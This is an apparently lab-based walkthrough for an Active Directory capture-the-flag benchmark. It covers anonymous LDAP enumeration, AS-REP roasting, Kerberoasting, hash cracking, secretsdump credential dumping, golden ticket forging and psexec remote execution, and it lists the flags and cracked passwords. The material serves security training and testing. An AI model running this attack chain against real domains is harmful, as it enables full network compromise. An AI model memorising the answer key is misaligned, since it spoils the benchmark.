# S7BEN-VHARD-003: Testing and Exploitation Guide

This guide provides a complete walkthrough of exploiting the Active Directory benchmark from reconnaissance to domain compromise.

## Prerequisites

Install required tools on your attack machine:

```bash
# Install Impacket
pip3 install impacket

# Install LDAP utilities
# On Debian/Ubuntu:
sudo apt-get install ldap-utils

# On macOS:
brew install openldap
```

# Build and start
make build
make up

# Run full exploitation chain
make test

# Get all flags
make get-flags

# Individual attacks
make enum-ldap         # Enumerate domain
make asrep-roast       # AS-REP roast bob
make file-admin-notes  # Extract admin credentials
make db-creds          # Query database credentials


## Phase 1: Reconnaissance

### Step 1.1: Anonymous LDAP Enumeration

First, enumerate the domain using anonymous LDAP bind to discover all users:

```bash
# Basic LDAP query to list all users
ldapsearch -x -H ldap://localhost:389 -b "dc=corp,dc=local" \
  "(objectClass=inetOrgPerson)" uid cn mail servicePrincipalName

# Expected output should include:
# - Administrator
# - alice
# - bob
# - svc_web (with SPN: HTTP/webapp.corp.local)
# - svc_sql (with SPN: MSSQLSvc/dbserver.corp.local)
```

**Alternative: Using Workstation API**

```bash
# Enumerate users via workstation API
curl http://localhost:5000/api/domain/users | jq

# Enumerate service principals (Kerberoasting targets)
curl http://localhost:5000/api/domain/spns | jq
```

### Step 1.2: Identify Vulnerable Accounts

From enumeration, you should identify:

1. **AS-REP Roasting Target:** bob (no pre-authentication required)
2. **Kerberoasting Targets:** svc_web, svc_sql (have SPNs)
3. **Valid Users:** alice, bob, Administrator

## Phase 2: AS-REP Roasting

### Step 2.1: Extract AS-REP Hash (bob)

The bob account has Kerberos pre-authentication disabled, making it vulnerable to AS-REP roasting:

```bash
# Using Impacket's GetNPUsers.py
GetNPUsers.py CORP.LOCAL/ -usersfile users.txt -dc-ip localhost -format hashcat

# Or target bob specifically
echo "bob" | GetNPUsers.py CORP.LOCAL/ -usersfile /dev/stdin -dc-ip localhost
```

**Using Workstation API:**

```bash
curl -X POST http://localhost:5000/api/kerberos/asrep-roast \
  -H "Content-Type: application/json" \
  -d '{"username": "bob"}'
```

**Expected Output:**
```
$krb5asrep$23$bob@CORP.LOCAL:...hash...
```

### Step 2.2: Crack AS-REP Hash

Save the hash and crack it with hashcat or john:

```bash
# Using hashcat (mode 18200 for AS-REP)
hashcat -m 18200 asrep_hash.txt /path/to/rockyou.txt

# Using john the ripper
john --wordlist=/path/to/rockyou.txt asrep_hash.txt

# The password is: BobPassword1
```

### Step 2.3: Obtain FLAG_ASREP

Once you successfully crack bob's hash, the workstation API returns the first flag:

```bash
curl -X POST http://localhost:5000/api/kerberos/asrep-roast \
  -H "Content-Type: application/json" \
  -d '{"username": "bob"}' | jq .flag
```

**FLAG_ASREP:** `S7BEN{asrep_roast_no_preauth_f3e8a1c7b9d2e6f5}`

## Phase 3: Domain Authentication

### Step 3.1: Obtain Kerberos TGT

Now that you have valid credentials (bob or alice), obtain a Kerberos ticket:

**Option A: Using kinit (if you have Kerberos client configured)**

```bash
# Create /etc/krb5.conf with CORP.LOCAL realm configuration
# Then obtain TGT:
kinit bob@CORP.LOCAL
# Password: BobPassword1

# Verify ticket
klist
```

**Option B: Using Workstation API**

```bash
curl -X POST http://localhost:5000/api/kerberos/tgt \
  -H "Content-Type: application/json" \
  -d '{
    "username": "bob",
    "password": "BobPassword1",
    "realm": "CORP.LOCAL"
  }'
```

**Option C: Using alice's credentials**

```bash
# Alice's credentials are known: alice:Alice123!
kinit alice@CORP.LOCAL
# Password: Alice123!
```

### Step 3.2: Access Web Application

Authenticate to the corporate web portal:

```bash
# Login as alice
curl -X POST http://localhost/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "alice",
    "password": "Alice123!"
  }' -c cookies.txt

# View profile
curl http://localhost/api/profile -b cookies.txt

# Enumerate services (reveals SPNs)
curl http://localhost/api/services -b cookies.txt | jq
```

**Expected Output from /api/services:**
```json
{
  "services": [
    {
      "name": "Web Application",
      "spn": "HTTP/webapp.corp.local",
      "account": "svc_web@CORP.LOCAL"
    },
    {
      "name": "Database Server",
      "spn": "MSSQLSvc/dbserver.corp.local",
      "account": "svc_sql@CORP.LOCAL"
    }
  ]
}
```

## Phase 4: Kerberoasting

### Step 4.1: Request Service Tickets

Use Impacket to request TGS tickets for service accounts:

```bash
# Kerberoast svc_web and svc_sql
GetUserSPNs.py CORP.LOCAL/alice:Alice123! -dc-ip localhost -request

# Or target specific SPN
GetUserSPNs.py CORP.LOCAL/alice:Alice123! -dc-ip localhost \
  -request-user svc_web

GetUserSPNs.py CORP.LOCAL/alice:Alice123! -dc-ip localhost \
  -request-user svc_sql
```

**Expected Output:**
```
$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/webapp.corp.local*$...hash...
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/dbserver.corp.local*$...hash...
```

### Step 4.2: Crack Service Account Passwords

Save the TGS hashes and crack them:

```bash
# Using hashcat (mode 13100 for Kerberoast)
hashcat -m 13100 kerberoast_hashes.txt /path/to/rockyou.txt

# Expected results:
# svc_web: ServiceWeb123
# svc_sql: SQLService456
```

## Phase 5: Lateral Movement

### Step 5.1: Access File Server

Use cracked service credentials to access the file server:

```bash
# List shares
curl http://172.30.0.20:8080/api/shares | jq

# List files in public share
curl http://172.30.0.20:8080/api/shares/public/files | jq

# Download credential files
curl http://172.30.0.20:8080/api/shares/public/files/db_config.txt
curl http://172.30.0.20:8080/api/shares/public/files/admin_notes.txt
```

**db_config.txt contains:**
```
Database Connection String: Server=dbserver.corp.local;Database=CorpDB;User=sa;Password=DBP@ssw0rd!
```

**admin_notes.txt contains:**
```
Admin credentials for emergency access:
Username: Administrator
Password: P@ssw0rd123!

NTLM Hash: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

### Step 5.2: Access Database Server

Query the database server for stored credentials:

```bash
# Get database info
curl http://172.30.0.40:5000/api/info | jq

# List database users
curl http://172.30.0.40:5000/api/users | jq

# Access vulnerable credentials endpoint
curl http://172.30.0.40:5000/api/credentials | jq
```

**Credentials table contains:**
- svc_web: ServiceWeb123
- svc_sql: SQLService456
- backup_admin: Backup2023!
- alice VPN password

## Phase 6: Privilege Escalation

### Step 6.1: Authenticate as Administrator

Use the discovered Administrator credentials:

```bash
# Login to web application as Administrator
curl -X POST http://localhost/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "Administrator",
    "password": "P@ssw0rd123!"
  }' -c admin_cookies.txt

# Access admin endpoint to get FLAG_KERBEROAST
curl http://localhost/api/admin/flag -b admin_cookies.txt | jq
```

**FLAG_KERBEROAST:** `S7BEN{kerberoast_service_account_a7b3c9d1e5f2g8h4}`

### Step 6.2: Obtain Kerberos TGT as Administrator

```bash
# Get Administrator TGT
kinit Administrator@CORP.LOCAL
# Password: P@ssw0rd123!

# Verify ticket cache
klist
```

## Phase 7: Domain Persistence (Golden Ticket)

### Step 7.1: Extract krbtgt Hash

Access the domain controller to extract the krbtgt account hash:

```bash
# Using Impacket's secretsdump
secretsdump.py CORP.LOCAL/Administrator:P@ssw0rd123!@localhost

# Look for krbtgt hash in output:
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:...
```

**Alternative: Check environment variable**

```bash
# The golden ticket flag is stored as an environment variable
docker compose exec domain-controller env | grep FLAG_GOLDEN_TICKET
```

### Step 7.2: Craft Golden Ticket

Use the krbtgt hash to create a golden ticket:

```bash
# Using Impacket's ticketer.py
ticketer.py -nthash <krbtgt_hash> \
  -domain-sid S-1-5-21-... \
  -domain CORP.LOCAL \
  -user FakeAdmin \
  FakeAdmin.ccache

# Set the ticket
export KRB5CCNAME=FakeAdmin.ccache

# Use the golden ticket
psexec.py CORP.LOCAL/FakeAdmin@dc.corp.local -k -no-pass
```

**FLAG_GOLDEN_TICKET:** `S7BEN{domain_admin_golden_ticket_dc5a8f2e1b9c3d4a}`

## Complete Attack Chain Summary

```
1. Anonymous LDAP Bind → Enumerate users and SPNs
   └─ Identify: bob (no preauth), svc_web, svc_sql (SPNs)

2. AS-REP Roasting → Extract bob's hash
   └─ Crack: BobPassword1
   └─ FLAG: S7BEN{asrep_roast_no_preauth_f3e8a1c7b9d2e6f5}

3. Authenticate as alice or bob
   └─ Access web application
   └─ Enumerate service accounts

4. Kerberoasting → Extract svc_web and svc_sql TGS hashes
   └─ Crack: ServiceWeb123, SQLService456

5. Lateral Movement
   ├─ File Server → Find admin_notes.txt
   └─ Database → Query credentials table
   └─ Discover: Administrator:P@ssw0rd123!

6. Privilege Escalation → Login as Administrator
   └─ FLAG: S7BEN{kerberoast_service_account_a7b3c9d1e5f2g8h4}

7. Domain Persistence → Extract krbtgt hash
   └─ Create golden ticket
   └─ FLAG: S7BEN{domain_admin_golden_ticket_dc5a8f2e1b9c3d4a}
```

## Troubleshooting

### LDAP Connection Issues

```bash
# Verify LDAP service is running
docker compose ps domain-controller

# Check LDAP connectivity
ldapsearch -x -H ldap://localhost:389 -b "" -s base
```

### Kerberos Issues

```bash
# Verify KDC is running
docker compose exec domain-controller service krb5-kdc status

# Check Kerberos connectivity
nc -zv localhost 88

# Verify realm configuration
docker compose exec domain-controller kadmin.local -q "listprincs"
```

### Container Issues

```bash
# View domain controller logs
docker compose logs domain-controller

# View all service logs
docker compose logs

# Restart specific service
docker compose restart domain-controller
```

## Advanced Exercises

1. **BloodHound Enumeration**: Use BloodHound to map AD relationships
2. **Pass-the-Hash**: Use NTLM hashes directly without cracking
3. **Pass-the-Ticket**: Export and reuse Kerberos tickets
4. **Silver Ticket**: Create service-specific tickets
5. **DCSync Attack**: Replicate AD database using replication rights

## Tools Reference

### Impacket Scripts

```bash
# AS-REP Roasting
GetNPUsers.py CORP.LOCAL/ -usersfile users.txt -dc-ip localhost

# Kerberoasting
GetUserSPNs.py CORP.LOCAL/alice:Alice123! -dc-ip localhost -request

# Credential Dumping
secretsdump.py CORP.LOCAL/Administrator:P@ssw0rd123!@localhost

# Golden Ticket
ticketer.py -nthash <hash> -domain-sid <SID> -domain CORP.LOCAL -user Admin admin.ccache

# Remote Execution
psexec.py CORP.LOCAL/Administrator:P@ssw0rd123!@dc.corp.local
```

### Hashcat Modes

```bash
# AS-REP (Kerberos 5 AS-REP etype 23)
hashcat -m 18200 asrep.txt wordlist.txt

# Kerberoast (Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 tgs.txt wordlist.txt

# NTLM
hashcat -m 1000 ntlm.txt wordlist.txt
```

## Success Criteria

- [ ] Successfully enumerate domain via anonymous LDAP
- [ ] Extract and crack AS-REP hash for bob
- [ ] Obtain FLAG_ASREP
- [ ] Authenticate as valid domain user
- [ ] Perform Kerberoasting on service accounts
- [ ] Crack service account passwords
- [ ] Access file server and database
- [ ] Discover Administrator credentials
- [ ] Obtain FLAG_KERBEROAST
- [ ] Extract krbtgt hash or access golden ticket flag
- [ ] Obtain FLAG_GOLDEN_TICKET

## Time Estimates

- Reconnaissance: 5-10 minutes
- AS-REP Roasting: 5-15 minutes (depending on cracking time)
- Kerberoasting: 10-20 minutes
- Lateral Movement: 5-10 minutes
- Privilege Escalation: 5 minutes
- Golden Ticket: 10-15 minutes

**Total:** 40-75 minutes (experienced), 2-3 hours (learning)
